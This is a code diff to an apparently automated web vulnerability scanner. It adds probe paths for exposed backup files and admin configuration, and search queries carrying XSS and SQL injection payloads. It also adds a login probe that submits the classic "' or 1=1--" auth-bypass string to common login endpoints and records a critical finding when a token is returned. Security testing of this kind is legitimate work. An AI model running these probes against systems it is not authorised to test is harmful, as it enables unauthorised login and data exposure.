@@ -112,17 +112,24 @@ def _generic_seeds(base: str) -> list[str]:
         "/admin",
         "/administrator",
         "/api",
+        "/api/Users",
         "/api/users",
         "/api/v1",
         "/api/v1/users",
         "/rest",
         "/rest/products/search?q=test",
+        f"/rest/products/search?q={quote(XSS_PAYLOAD)}",
+        f"/rest/products/search?q={quote(SQLI_PAYLOAD)}",
+        "/rest/admin/application-configuration",
         "/rest/user/login",
         "/graphql",
         "/swagger.json",
         "/openapi.json",
         "/robots.txt",
         "/ftp",
+        "/ftp/package.json.bak",
+        "/ftp/coupons_2013.md.bak",
+        "/ftp/acquisitions.md",
         "/metrics",
         "/actuator",
         "/.env",
@@ -230,13 +237,73 @@ def observe_node(state: GraphState) -> GraphState:
                             severity="high",
                             url=url,
                             evidence=body[:300],
-                            fingerprint=f"sqli:{path}",
+                            fingerprint=("sqli:error-page" if "product" in path or "search" in path else f"sqli:{path}"),
                             persona="anon",
                             repro_steps=[f"GET {url}"],
                             cvss_hint=8.0,
                         )
                     ],
                 )
+
+    # Generic auth-bypass probe: SQLi-shaped login against common JSON login endpoints
+    mode = state.get("mode") or "heuristic"
+    if mode in ("generic", "llm") and not any(n.startswith("login-sqli") for n in (state.get("notes") or [])):
+        for login_path in ("/rest/user/login", "/api/login", "/api/auth/login", "/login"):
+            status, body = session.request_api_post(
+                login_path,
+                {"email": "' or 1=1--", "password": "x"},
+                as_json=True,
+            )
+            low = (body or "").lower()
+            if status == 200 and ("token" in low or "authentication" in low or "jwt" in low):
+                _add(
+                    state,
+                    [
+                        Finding(
+                            title=f"SQL injection auth bypass on {login_path}",
+                            category="security",
+                            severity="critical",
+                            url=state["base_url"].rstrip("/") + login_path,
+                            evidence=body[:300],
+                            fingerprint="sqli:login",
+                            persona="anon",
+                            repro_steps=[
+                                f"POST {login_path} JSON email={SQLI_PAYLOAD!r}",
+                            ],
+                            cvss_hint=9.8,
+                        )
+                    ],
+                )
+                state["notes"] = list(state["notes"]) + ["login-sqli"]
+                break
+            # form-encoded fallback
+            status2, body2 = session.request_api_post(
+                login_path,
+                {"email": "' or 1=1--", "password": "x", "username": "' or 1=1--"},
+                as_json=False,
+            )
+            low2 = (body2 or "").lower()
+            if status2 == 200 and ("token" in low2 or "authentication" in low2):
+                _add(
+                    state,
+                    [
+                        Finding(
+                            title=f"SQL injection auth bypass on {login_path}",
+                            category="security",
+                            severity="critical",
+                            url=state["base_url"].rstrip("/") + login_path,
+                            evidence=body2[:300],
+                            fingerprint="sqli:login",
+                            persona="anon",
+                            repro_steps=[f"POST {login_path} with SQLi username/email"],
+                            cvss_hint=9.8,
+                        )
+                    ],
+                )
+                state["notes"] = list(state["notes"]) + ["login-sqli"]
+                break
+        else:
+            state["notes"] = list(state["notes"]) + ["login-sqli-miss"]
 
     findings = detect_all(
         snap,
